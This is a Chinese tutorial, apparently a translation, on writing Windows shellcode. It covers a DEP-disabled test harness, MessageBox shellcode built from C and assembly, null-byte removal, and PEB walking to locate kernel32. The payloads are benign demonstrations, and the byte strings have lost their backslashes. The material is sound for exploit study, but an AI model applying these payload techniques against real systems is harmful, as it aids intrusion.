# 一步步学写Windows下的Shellcode
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
如何在WIndows下编写一个shellcode？为什么会问这个问题，前段时间在做win下的Exploit，但是都是使用大佬写的shellcode，无法实现个人的一些需求。而网络上编写shellcode的教程大多是关于Linux的，加之顺带学习PE文件结构，所以打算写一篇关于Windows
下shellcode的编写，为要编写Shellcdoe的读者提供一些参考。
## 摘要：
在C语言中，调用一个函数，编写者无需关心函数地址是如何获取的，所有的操作IDE在进行链接的时候帮助我们完成了。但是在shellcode中，这些操作都需要我们自己去完成，理解PE结构，理解函数表，这些都是shellcode编写最有魅力的一部分。
本文的逻辑首先是从C代码着手，学习如何使用汇编重现的基础，编写一个无移植性的shellcode作基础引导。在掌握了硬编码编写之后，通过掌握获取函数导出表，编写能够在所有Windows版本上运行的通用shellcode。
这篇文章时间跨度比较久远，起笔还是暑假在贵阳的时候，后来做了一段时间WEB安全，这篇文章便写了一小半就烂尾了。后来投入到Win/Browser下漏洞的怀抱中（最近又回Ubuntu了，渣男。出戏：陆司令：何书桓！你在我的两个女儿之间跳来跳去，算什么东西！），需要在WIN7下做一些自定义shellcode，自己之前自定义的shellcode居然无法在WIN7下运行，于是想起这篇未完工的文章，借此对shellcode编写做一次总结与复习。
## 0x00 创建自己的SC实验室
当我们创建自己的shellcode实验室时候，我们必须清楚无论是自己编写的，亦或者是网络上获取的shellcode，我们都需要对其的行为有一个深刻的了解。
首先是安全性，要做的就是在一个相对安全的环境下进行测试（例如虚拟机），以保证不会被黑吃黑。
其次，这个测试方法要足够方便。不能将shellcode随意的扔到自己写的Exploit中进行测试，因为大多数Exploit对shellcode的格式要求是非常严格的，尤其是栈溢出方面的漏洞。初期编写的shellcode可能包含大量Null字节，容易被strcpy截断。（比如笔者写的shellcode基本都通不过栈溢出的测试。。汗，一般直接扔到Browser的Exploit里）
下面是我们的shellcode调试环境，如果是WIN7以后的版本需要将DEP选项关闭。
**_Shellcode-lab_**
调试一段shellcode  
环境：windows xp sp0  
编译器：VC++6.0
     char shellcode[]="xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8bx50x30"
    "x8bx52x0cx8bx52x14x8bx72x28x0fxb7x4ax26x31xff"
    "xacx3cx61x7cx02x2cx20xc1xcfx0dx01xc7xe2xf2x52"
    "x57x8bx52x10x8bx4ax3cx8bx4cx11x78xe3x48x01xd1"
    "x51x8bx59x20x01xd3x8bx49x18xe3x3ax49x8bx34x8b"
    "x01xd6x31xffxacxc1xcfx0dx01xc7x38xe0x75xf6x03"
    "x7dxf8x3bx7dx24x75xe4x58x8bx58x24x01xd3x66x8b"
    "x0cx4bx8bx58x1cx01xd3x8bx04x8bx01xd0x89x44x24"
    "x24x5bx5bx61x59x5ax51xffxe0x5fx5fx5ax8bx12xeb"
    "x8dx5dx6ax01x8dx85xb2x00x00x00x50x68x31x8bx6f"
    "x87xffxd5xbbxf0xb5xa2x56x68xa6x95xbdx9dxffxd5"
    "x3cx06x7cx0ax80xfbxe0x75x05xbbx47x13x72x6fx6a"
    "x00x53xffxd5x6ex6fx74x65x70x61x64x2ex65x78x65"
    "x00";
    int main(int argc,char **argv)
    {
        /*方法一 VC++6.0 error报错*/
        /*
        int(*func)(); //创建一个函数指针func
        func=(int (*)())shellcode; //将shellcode的地址赋值给func
        (int)(*func)();//调用func
        */
    /*方法二 asm*/
        __asm
        {
            lea eax,shellcode//将shellcode地址赋值给eax
            push eax//将eax入栈
            ret//跳转到eax地址
        }
    //PS:第二种方法只有关闭NX/DEP才行（XP下就没有这个问题）
    }
## 0x01从C到shellcode
shellcode大多是包含很多恶意行为的代码，就如它名字由来的那样 “获取shell的代码”。
但是在漏洞大多数复现中，我们需要做的仅仅是证明自己能够利用，所以我们编写的shellcode需要满足无害性和可见性。例如弹出一个计算器，或者如下面的C代码一样，让Exploit弹出一个极具个人风格的MessageBox也是一个不错的选择。
C实现非常简单，只需要调用MessageBox函数，写入参数。
    #include
    int main(int argc,char** argv)
    {
    ​    MessageBox(NULL,"You are hacked by Migraine!","Pwned",MB_OK);
    }
放入IDA，查找到Main函数的位置。  
可以查看反汇编，四个参数分别PUSH入栈，然后调用MessageBoxA  
MSDN对MessageBox的描述
    int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaptioUINT uType );
在OD中下断点调试，得到同样的结果。
基于调试可知，MessageBoxA从USER32.DLL加载到内存的地址为0x77D3ADD7  
当然这个地址是非常不稳定的，受到操作系统版本还有很多因素(例如ASLR)的影响  
不过为了简便shellcode，目前将这部分先放一放。
在我们编写的另一个程序中（见下文），发现这个函数依旧被映射到了同一个位置  
因为XP没有开启ASLR的缘故，DLL加载的基地址不会变化  
值得注意的是该程序需要调用USER32.DLL，否则需要手动LoadLibrary
但是现在这段C生成的代码，直接提取字节码是行不通的。  
函数的参数被放在了该程序的Rodata段中调用，与地址无关的段。  
而我们要求shellcode能在任何环境下运行，需要保证参数可控，即需要将参数入栈，然后再调用。
接下来用汇编重写一遍（C嵌入asm）  
通过自己将数据入栈，然后调用MessageBoxA
    #include
    void main()
    {
        LoadLibrary("user32.dll");//Load DLL
        __asm
        {    
            push 0x00656e;ne
            push 0x69617267;grai
            push 0x694d2079;y Mi
            push 0x62206565;ed b
            push 0x6b636168;hack
            push 0x20657261;Are
            push 0x20756F59;You
            mov ebx,esp
            push 0x0
            push 0x656e6961;aine
            push 0x7267694d;Migr
            mov ecx,esp
            //int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,UINT uType );
            xor eax,eax
            push eax//uTyoe->0
            push ecx//lpCaption->Migraine
            push ebx//lpText->You are hacked by Migraine
            push eax//hWnd->0
            mov esi,0x77D3ADD7//User32.dll->MessageBoxA
            call esi 
        }
    }
将ASM提取字节码
再OD中查看这一段ASM
使用UltraEditor查看16进制字节码，然后找到我们的ASM，复制便成功提取了我们的shellcode
    68 6E 65 00 00 68 67 72 61 69 68 79 20 4D 69 68
    65 65 20 62 68 68 61 63 6B 68 61 72 65 20 68 59
    6F 75 20 8B DC 6A 00 68 61 69 6E 65 68 4D 69 67
    72 8B CC 33 C0 50 51 53 50 BE D7 AD D3 77 FF D6
    5F 5E 5B 83 C4 40 3B EC E8 97 3B FF FF
调整一下格式，便获取到了shellcode
    char shellcode[]="x68x6Ex65x00x00x68x67x72x61x69x68x79x20x4Dx69x68"
    "x65x65x20x62x68x68x61x63x6Bx68x61x72x65x20x68x59"
    "x6Fx75x20x8BxDCx6Ax00x68x61x69x6Ex65x68x4Dx69x67"
    "x72x8BxCCx33xC0x50x51x53x50xBExD7xADxD3x77xFFxD6"
    "x5Fx5Ex5Bx83xC4x40x3BxECxE8x97x3BxFFxFF";
放入上文搭建的shellcode调试环境，添加LoadLibrary(“user32.dll”);以及头文件#include
在WInodws xp下运行效果理想
###  优化shellcode
去除null字节
这里使用xor配合sub就能够完全去除null，还有一些其他方法，使用16位寄存器避免null字节，在《exploit编写教程》上面都有详细的介绍，就不再重复造轮子了。
    __asm
    ​    {    
    /*使用sub来替换/x00*/
    ​        mov eax,0x1111767f
    ​        sub eax,0x11111111
    ​        push eax
    ​        //push 0x0000656e;ne
    ​        push 0x69617267;grai
    ​        push 0x694d2079;y Mi
    ​        push 0x62206565;ed b
    ​        push 0x6b636168;hack
    ​        push 0x20657261;Are
    ​        push 0x20756F59;You
    ​        mov ebx,esp
    /*使用xor来替换/x00*/
    ​        xor eax,eax
    ​        push eax
    ​        //push 0x0
    ​        push 0x656e6961;aine
    ​        push 0x7267694d;Migr
    ​        mov ecx,esp
    ​        //int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,UINT uType );
    ​        xor eax,eax
    ​        push eax//uTyoe->0
    ​        push ecx//lpCaption->Migraine
    ​        push ebx//lpText->You are hacked by Migraine
    ​        push eax//hWnd->0
    ​        mov esi,0x77D3ADD7//User32.dll->MessageBoxA
    ​        call esi 
    ​    }
此时生成的shellcode就不存在x00了
## 0x02编写更稳定Shellcode
如何提高shellcode 的可移植性一直是一个需要我们在一的问题。
前文我们编写的MessageBoxA的地址是硬编码的，导致这段shellcode只能利用于windows xp sp0。
但是Windows并不支持像Linux那样的int
0x80中断呼叫函数的操作，于是唯一的方法就是通过PE文件中的函数导出表获取函数此刻的地址，这个方法在提高可移植性的同时，还可以一劳永逸地解决ASLR带来的地址偏移问题。
###  1\. 动态定位kernel32.dll
不同版本的操作系统，kernel32.dll的基地址也是不同的。Windows没有linux那样方便的中断机制来调用系统函数，所以只能通过基址+偏移地址来确定函数的位置。
通过PEB获得基址
我们可以通过Windbg解析PEB（WindowsXP符号表已经不再支持自动下载）
所以手动下载安装WindowsXP-KB936929-SP3-x86-symbols-full-ENU.exe
但是碰到一些问题，所以在Windows10下用Windbg(x86)进行PEB分析
使用windbg加载任意一个x86程序，会出现break，等待到出现int 3即可进行操作
!peb可以自动分析，可以查询到KERNEL32.DLL的地址。
PEB是进程环境块，由TEB线程环境块偏移0x30字节。我们这里需要直到查找地址的原理。  
大概流程是通过FS段选择器找到TEB，通过TEB找到PEB，然后获取kernel和ntdll的地址。  
接下来我们在windbg中，来手工实现PEB结构分析，之后会使用汇编完成Kernel基址的读取。  
查看PEB结构
直接查看LDR结构
偏移0xc，选择InLoadOrderModuleList  
查看这个_LIST_ENTRY结构
_LIST_ENTRY 是一个存放双向链表的数据结构（包含于_LDR_DATA_TABLE_ENTRY）  
_LDR_DATA_TABLE_ENTRY是存放载入模块信息的结构，并且是由_LIST_ENTRY这个双向链表串联起来。  
由三种串联方式，区别仅在于排列顺序（上文我们偏移0x14选择InMemoryOrderModuleList ）
       +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x51c00 - 0x78f6b88 ]
       +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x51c08 - 0x78f6b90 ]
       +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x51c90 - 0x78f6b98 ]
第一个_List_ENTRY指向的地址是0x51c08(因为InMemoryOrderModuleList的指针指向的是下一个结构的InMemoryOrderModuleList，而不是_LDR_DATA_TABLE_ENTRY的结构头，需要偏移0x8)
查看对应的_LDR_DATA_TABLE_ENTRY结构，得知这是iexplore.exe(调试的宿主程序)的基地址为0x01120000（DLLBase）
接下来顺着LIST_ENTRY,往下寻找结点。发现kernel在第三个结点。
查看这个地址的_LDR_DATA_TABLE_ENTRY结构  
通过这两次观察，可以发现，实际上这个结构体的第一个结构就是_List_ENTRY,负责将这些_LDR_DATA_TABLE_ENTRY结构串联成链表。  
偏移0x18可以得出DllBase为0x77e10000
成功获取Kernel的基地址。  
用接下来用汇编实现kernel地址的读取  
原理是在InMemoryOrderModuleList结构中，kernel位置固定为第三个。
    global CMAIN
    CMAIN:
    mov ebp, esp; for correct debugging
    xor ebx,ebx
    mov ebx,[fs:0x30] ;TEB+0x30->PEB
    mov ebx,[ebx+0xc] ;PEB+0xc->LDR
    mov ebx,[ebx+0x14] ;LDR+0x14->InMemoryOrderModuleList-->_LIST_ENTRY第一个节点->??.dll
    mov ebx,[ebx] ;-->_LIST_ENTRY第二个节点->ntdll.dll
    mov ebx,[ebx] ;-->_LIST_ENTRY第三个节点->Kernel.dll
    mov ebx,[ebx+0x10]; DllBase偏移0x18减去指向偏移0x8;下文会详细分析
    xor eax, eax